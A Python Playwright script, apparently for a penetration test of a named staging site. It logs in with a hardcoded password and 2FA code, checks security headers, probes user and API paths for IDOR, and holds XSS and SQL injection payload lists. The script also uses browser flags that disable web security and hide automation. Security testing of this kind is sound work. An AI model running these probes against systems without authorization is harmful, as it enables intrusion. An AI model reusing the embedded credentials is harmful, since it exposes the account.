#!/usr/bin/env python3
"""
Askmebill SIT - Automated Penetration Testing
Using Playwright for browser automation

Target: https://sit.askmebill.com/
Credentials: uuio11 / 0897421942@Earth / 2FA: 954900
"""

import asyncio
import json
from playwright.async_api import async_playwright
from datetime import datetime

# Configuration
TARGET_URL = "https://sit.askmebill.com/"
USERNAME = "uuio11"
PASSWORD = "0897421942@Earth"
TOTP_CODE = "954900"
OUTPUT_FILE = f"askmebill-test-results-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

class AskmebillPentest:
    def __init__(self):
        self.results = {
            "target": TARGET_URL,
            "timestamp": datetime.now().isoformat(),
            "tests": []
        }
    
    async def run_all_tests(self):
        """Run all penetration tests"""
        async with async_playwright() as p:
            # Launch browser with stealth settings
            browser = await p.chromium.launch(
                headless=False,  # Set to True for production
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                ]
            )
            
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            
            page = await context.new_page()
            
            try:
                # Test 1: Initial Reconnaissance
                await self.test_reconnaissance(page)
                
                # Test 2: Login Functionality
                await self.test_login(page)
                
                # Test 3: 2FA Verification
                await self.test_2fa(page)
                
                # Test 4: Authenticated Area Testing
                await self.test_authenticated_areas(page)
                
                # Test 5: Input Validation
                await self.test_input_validation(page)
                
            except Exception as e:
                self.log_result("error", str(e), "exception")
            
            finally:
                await browser.close()
                self.save_results()
    
    async def test_reconnaissance(self, page):
        """Test 1: Initial reconnaissance"""
        print("[*] Test 1: Initial Reconnaissance")
        
        response = await page.goto(TARGET_URL, wait_until='networkidle')
        
        # Get security headers
        headers = await response.all_headers()
        security_headers = {
            'strict-transport-security': headers.get('strict-transport-security', 'MISSING'),
            'x-frame-options': headers.get('x-frame-options', 'MISSING'),
            'x-content-type-options': headers.get('x-content-type-options', 'MISSING'),
            'content-security-policy': headers.get('content-security-policy', 'MISSING'),
            'x-xss-protection': headers.get('x-xss-protection', 'MISSING'),
        }
        
        self.log_result("security_headers", security_headers, "info")
        
        # Get page info
        title = await page.title()
        url = page.url
        
        self.log_result("page_info", {"title": title, "url": url}, "info")
        
        # Check for forms
        forms = await page.query_selector_all('form')
        self.log_result("forms_found", len(forms), "info")
        
        print(f"    ✅ Found {len(forms)} forms")
        print(f"    ✅ Security headers: {security_headers}")
    
    async def test_login(self, page):
        """Test 2: Login functionality"""
        print("[*] Test 2: Login Functionality")
        
        # Find login form
        username_field = await page.query_selector('input[type="text"], input[name="username"], input[id="username"]')
        password_field = await page.query_selector('input[type="password"], input[name="password"], input[id="password"]')
        
        if not username_field or not password_field:
            self.log_result("login_form", "Login form not found", "warning")
            print("    ⚠️  Login form not found")
            return
        
        # Fill credentials
        await username_field.fill(USERNAME)
        await password_field.fill(PASSWORD)
        
        # Take screenshot before submit
        await page.screenshot(path="login_filled.png")
        
        # Submit form
        submit_button = await page.query_selector('button[type="submit"], input[type="submit"]')
        if submit_button:
            await submit_button.click()
        else:
            await password_field.press('Enter')
        
        # Wait for navigation or 2FA
        await page.wait_for_timeout(3000)
        
        # Check if redirected to 2FA
        current_url = page.url
        if '2fa' in current_url.lower() or 'otp' in current_url.lower():
            self.log_result("login_step1", "Success - Redirected to 2FA", "success")
            print("    ✅ Login step 1 successful - 2FA required")
        else:
            # Check for error messages
            error_msg = await page.query_selector('.error, .alert-error, [role="alert"]')
            if error_msg:
                error_text = await error_msg.text_content()
                self.log_result("login_step1", f"Failed: {error_text}", "failure")
                print(f"    ❌ Login failed: {error_text}")
            else:
                self.log_result("login_step1", "Unknown state", "warning")
                print("    ⚠️  Unknown login state")
    
    async def test_2fa(self, page):
        """Test 3: 2FA verification"""
        print("[*] Test 3: 2FA Verification")
        
        # Look for 2FA input
        totp_field = await page.query_selector('input[name="totp"], input[name="otp"], input[name="2fa"], input[type="text"]')
        
        if not totp_field:
            self.log_result("2fa_form", "2FA form not found", "warning")
            print("    ⚠️  2FA form not found")
            return
        
        # Fill 2FA code
        await totp_field.fill(TOTP_CODE)
        
        # Submit
        submit_button = await page.query_selector('button[type="submit"]')
        if submit_button:
            await submit_button.click()
        else:
            await totp_field.press('Enter')
        
        # Wait for login completion
        await page.wait_for_timeout(3000)
        
        # Check if logged in
        current_url = page.url
        if 'login' not in current_url.lower() and 'auth' not in current_url.lower():
            self.log_result("2fa_verification", "Success - Logged in", "success")
            print("    ✅ 2FA successful - Logged in")
            
            # Take screenshot of dashboard
            await page.screenshot(path="dashboard.png")
        else:
            error_msg = await page.query_selector('.error, .alert-error')
            if error_msg:
                error_text = await error_msg.text_content()
                self.log_result("2fa_verification", f"Failed: {error_text}", "failure")
                print(f"    ❌ 2FA failed: {error_text}")
    
    async def test_authenticated_areas(self, page):
        """Test 4: Test authenticated areas"""
        print("[*] Test 4: Authenticated Areas")
        
        # Look for navigation/menu
        links = await page.query_selector_all('a[href]')
        link_urls = []
        for link in links[:10]:  # Limit to first 10
            href = await link.get_attribute('href')
            if href and href.startswith('/'):
                link_urls.append(href)
        
        self.log_result("discovered_links", link_urls, "info")
        print(f"    ✅ Found {len(link_urls)} internal links")
        
        # Test IDOR - try to access different user IDs
        test_urls = [
            "/user/1",
            "/user/2",
            "/api/user/profile",
            "/api/account",
            "/settings",
        ]
        
        idor_results = []
        for test_url in test_urls:
            try:
                response = await page.goto(f"{TARGET_URL}{test_url}", wait_until='domcontentloaded', timeout=5000)
                status = response.status if response else 0
                idor_results.append({"url": test_url, "status": status})
            except:
                idor_results.append({"url": test_url, "status": "error"})
        
        self.log_result("idor_test", idor_results, "info")
        print(f"    ✅ IDOR test completed")
    
    async def test_input_validation(self, page):
        """Test 5: Input validation testing"""
        print("[*] Test 5: Input Validation")
        
        # XSS payloads to test
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
        ]
        
        # SQL Injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
        ]
        
        # Find all input fields
        inputs = await page.query_selector_all('input:not([type="hidden"]), textarea')
        
        validation_results = []
        for i, input_field in enumerate(inputs[:5]):  # Test first 5 inputs
            input_type = await input_field.get_attribute('type') or 'text'
            input_name = await input_field.get_attribute('name') or f'input_{i}'
            
            # Try XSS
            for payload in xss_payloads[:1]:  # Test first payload
                try:
                    await input_field.fill(payload)
                    await asyncio.sleep(0.5)
                    
                    # Check if input was sanitized
                    value = await input_field.input_value()
                    if payload in value:
                        validation_results.append({
                            "field": input_name,
                            "type": "XSS",
                            "payload": payload,
                            "sanitized": False
                        })
                    else:
                        validation_results.append({
                            "field": input_name,
                            "type": "XSS",
                            "payload": payload,
                            "sanitized": True
                        })
                except:
                    pass
        
        self.log_result("input_validation", validation_results, "info")
        print(f"    ✅ Input validation test completed on {len(inputs)} fields")
    
    def log_result(self, test_name, result, status):
        """Log test result"""
        self.results["tests"].append({
            "test": test_name,
            "result": result,
            "status": status,
            "timestamp": datetime.now().isoformat()
        })
    
    def save_results(self):
        """Save results to file"""
        with open(OUTPUT_FILE, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[*] Results saved to: {OUTPUT_FILE}")

async def main():
    print("=" * 60)
    print("  Askmebill SIT - Penetration Testing")
    print(f"  Target: {TARGET_URL}")
    print("=" * 60)
    print()
    
    # Check if playwright is installed
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        print("[!] Playwright not installed. Installing...")
        import subprocess
        subprocess.run(['pip', 'install', 'playwright'])
        subprocess.run(['playwright', 'install', 'chromium'])
        print("[!] Please run the script again")
        return
    
    pentest = AskmebillPentest()
    await pentest.run_all_tests()
    
    print()
    print("=" * 60)
    print("  Testing Completed")
    print("=" * 60)

if __name__ == "__main__":
    asyncio.run(main())
